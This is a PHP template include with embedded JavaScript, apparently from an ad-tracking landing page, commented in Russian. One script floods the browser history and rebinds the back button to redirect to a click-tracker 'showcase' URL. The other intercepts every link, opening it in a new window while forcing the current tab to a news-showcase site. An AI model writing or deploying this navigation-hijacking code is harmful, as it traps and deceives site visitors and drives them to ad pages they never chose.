<?php
    include ('settings.php');
	if (strpos($settings, 'popup') !== false)
	{ 
		include ('popup.php');
    } 
	if (strpos($settings, 'vitrina') !== false)
	{ 
?>
<script type="text/javascript">
var news = 'https://tracker.el-slim.in.ua/click.php?key=qlgvhqjsk2pak54thoxd&ad_id=ad_id&t4=vitrina'; // <-- ссылка на витрину 
$(document).ready(function() {
    //биндим "назад" на витрину
    ! function() {
        var t;
        try {
            for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
            onpopstate = function(t) {
                t.state && location.replace(news)
            }
        } catch (o) {}
    }();
})
</script>
<script type="text/javascript">
$(function() {
    $('a').click(function() {
        comebacker = null;
        window.open($(this).attr('href'));
        setTimeout(function() {
            window.location.href = 'http://one-news.info/vitrina';
            return false;
        }, 0000);
        return false;
    })
})
</script>
<?php
	} 
?>
